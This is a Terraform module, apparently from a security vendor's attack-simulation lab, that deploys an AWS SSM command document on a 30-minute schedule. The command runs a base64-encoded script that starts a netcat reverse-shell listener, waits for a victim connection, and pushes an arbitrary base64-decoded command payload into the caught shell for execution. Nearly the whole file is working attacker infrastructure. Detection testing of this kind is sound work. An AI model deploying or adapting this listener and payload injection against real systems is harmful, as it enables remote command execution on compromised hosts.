locals {
    listen_port = var.listen_port
    listen_ip = var.listen_ip
    base64_command_payload = base64encode(var.payload)
    payload = <<-EOT
    LOGFILE=/tmp/attacker_exec_reverseshell_listener.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "listener: ${local.listen_ip}:${local.listen_port}"
    while true; do
        screen -ls | grep netcat | cut -d. -f1 | awk '{print $1}' | xargs kill
        truncate -s 0 /tmp/netcat.log
        screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}
        screen -S netcat -X colon "logfile flush 0^M"
        log "listener started.."
        until tail /tmp/netcat.log | grep -m 1 "Connection received"; do
            log "waiting for connection...";
            sleep 10;
        done
        sleep 30
        log 'sending screen command: ${var.payload}';
        screen -S netcat -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
        sleep 300
        log "restarting attacker session..."
    done
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

resource "aws_ssm_document" "exec_reverse_shell_attacker" {
  name          = "exec_reverse_shell_${var.environment}_${var.deployment}"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "exec reverse shell attacker",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_reverse_shell_attacker",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "600",
                    "runCommand": [
                        "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_reverse_shell_attacker" {
    name = "exec_reverse_shell_${var.environment}_${var.deployment}"

    resource_query {
        query = jsonencode(var.resource_query_exec_reverse_shell_attacker)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_reverse_shell_attacker" {
    association_name = "exec_reverse_shell_${var.environment}_${var.deployment}"

    name = aws_ssm_document.exec_reverse_shell_attacker.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_reverse_shell_attacker.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}